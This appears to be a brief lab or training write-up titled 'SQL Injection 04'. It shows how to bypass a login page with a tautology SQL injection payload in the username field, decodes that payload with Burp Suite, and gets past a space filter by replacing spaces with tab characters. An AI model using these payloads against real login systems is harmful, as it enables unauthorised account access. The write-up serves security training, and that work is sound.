## SQL INJECTION 04

1. To solve this exercise, you need to find a way to bypass the login page using a SQL Injection vulnerability. 

2. You Have a login page and bypass the login page 

3. Generate a error

         username=admin%27+or+%271%27%3D%271+--&password=admin

7. Use Burp-Suite Decoder and decode like

          username=admin' or '1'='1 --&password=admin

8. Notice That the paylods don't use SPACE use every + change and write %09 like

            username=admin%27%09or%09%271%27%3D%271%09--&password=admin
